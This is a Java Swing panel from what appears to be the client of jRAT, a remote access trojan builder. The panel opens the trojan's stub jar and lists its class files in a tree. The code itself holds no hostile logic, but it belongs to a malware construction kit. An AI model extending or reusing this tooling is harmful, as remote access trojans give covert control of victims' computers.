package su.jrat.client.ui.panels;

import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTree;
import javax.swing.ScrollPaneConstants;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;

import su.jrat.client.Globals;
import su.jrat.client.ui.renderers.JTreeIconRenderer;
import su.jrat.client.utils.IconUtils;


@SuppressWarnings("serial")
public class PanelBuildClasses extends JPanel {

	public PanelBuildClasses() {

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 431, GroupLayout.PREFERRED_SIZE).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 277, GroupLayout.PREFERRED_SIZE).addContainerGap(12, Short.MAX_VALUE)));

		JTree tree = new JTree();
		tree.setShowsRootHandles(true);
		tree.setRootVisible(false);
		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Root") {
			{
				addNodes(this);
			}
		}));
		tree.setCellRenderer(new JTreeIconRenderer(IconUtils.getIcon("java_class")));
		scrollPane.setViewportView(tree);
		setLayout(groupLayout);

	}

	public void addNodes(DefaultMutableTreeNode n) {
		try {
			ZipFile zip = new ZipFile(Globals.getStub());

			Enumeration<? extends ZipEntry> entries = zip.entries();

			while (entries.hasMoreElements()) {
				ZipEntry entry = entries.nextElement();
				String name = entry.getName().toLowerCase();

				if (name.endsWith(".class")) {
					n.add(new DefaultMutableTreeNode(entry.getName().replace("/", ".").replace(".class", "")));
				}
			}
			zip.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}
